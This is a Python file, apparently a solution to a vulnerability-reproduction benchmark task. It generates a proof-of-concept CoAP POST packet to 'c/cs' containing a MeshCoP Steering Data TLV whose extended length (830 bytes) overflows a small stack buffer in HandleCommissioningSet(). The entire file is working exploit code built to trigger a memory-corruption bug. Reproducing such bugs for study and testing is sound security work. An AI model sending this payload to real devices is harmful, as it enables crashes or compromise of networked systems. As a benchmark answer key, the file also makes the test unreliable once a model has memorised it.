import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (arvo:20775 / CVE-2019-20775) is a stack buffer overflow in 
        HandleCommissioningSet() due to improper handling of extended TLV lengths in 
        Commissioner Dataset TLVs.
        
        We construct a CoAP POST request to 'c/cs' containing a MeshCoP Steering Data TLV
        with an extended length field that exceeds the stack buffer size (typically 16 bytes),
        matching the ground truth length of 844 bytes.
        """
        
        # CoAP Header
        # Ver: 1, Type: CON (0), TKL: 0 -> 0x40
        # Code: POST (0.02) -> 0x02
        # MsgID: 0x1234 (arbitrary)
        header = b'\x40\x02\x12\x34'
        
        # CoAP Options
        # Uri-Path: "c/cs"
        # Option 1: Uri-Path (11). Delta = 11. Length = 1. Value = "c".
        # Byte: (11 << 4) | 1 = 0xB1
        opt1 = b'\xB1c'
        
        # Option 2: Uri-Path (11). Delta = 0 (since 11 + 0 = 11). Length = 2. Value = "cs".
        # Byte: (0 << 4) | 2 = 0x02
        opt2 = b'\x02cs'
        
        options = opt1 + opt2
        
        # Payload Marker
        marker = b'\xFF'
        
        # Current length so far
        prefix_len = len(header) + len(options) + len(marker) # 4 + 5 + 1 = 10 bytes
        
        # Target total length is 844 bytes.
        # Payload size needed = 844 - 10 = 834 bytes.
        
        # Construct a Malicious TLV
        # Type: Steering Data (8) - Destination buffer is small (16 bytes)
        # Length: 0xFF (Indicates Extended Length)
        # Extended Length: 2 bytes (Big Endian)
        # Value: N bytes
        # TLV Size = 1 (Type) + 1 (Len) + 2 (ExtLen) + N = 4 + N
        # We need 4 + N = 834 => N = 830
        
        tlv_type = 8
        tlv_len_marker = 0xFF
        tlv_ext_len = 830
        
        # MeshCoP uses Big Endian for multi-byte fields
        tlv_header = struct.pack('>BBH', tlv_type, tlv_len_marker, tlv_ext_len)
        tlv_value = b'A' * tlv_ext_len
        
        payload = tlv_header + tlv_value
        
        return header + options + marker + payload
